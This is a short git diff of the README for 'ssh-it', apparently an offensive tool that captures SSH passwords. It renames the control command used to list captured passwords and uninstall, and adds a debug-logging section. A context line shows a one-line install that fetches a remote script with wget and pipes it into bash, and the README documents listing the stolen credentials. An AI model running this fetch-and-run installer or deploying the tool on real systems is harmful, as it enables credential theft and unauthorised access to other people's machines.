@@ -16,7 +16,7 @@ bash -c "$(wget --no-verbose -O- ssh-it.thc.org/x)"
 
 To show all captured passwords use:
 ```shell
-~/.prng/thc_ctl -r list
+~/.prng/thc_cli -r list
 ```
 {:refdef: style="text-align: center;"}
 ![Deploy-Example](list-example.png)
@@ -25,7 +25,7 @@ To show all captured passwords use:
 
 To uninstall use:
 ```shell
-~/.prng/thc_ctl -r uninstall
+~/.prng/thc_cli -r uninstall
 ```
 
 ### ALPHA TESTING
@@ -89,7 +89,13 @@ chmod 755 ssh-it-deploy.sh && \
 ./ssh-it-deploy.sh
 ```
 
-Special thanks to Gerald and BadAdvert1zer for ideas and testing.
+#### Debug Output
+Help us fix bug and send us ```thc.log``` if a boo-boo happens:
+```shell
+THC_DEBUG=1 THC_DEBUG_LOG=thc.log ssh user@yourhost "id"
+```
+
+Special thanks to Gerald, BadAdvert1zer and DoctorWho for ideas and testing.
 
 ### Contact
 
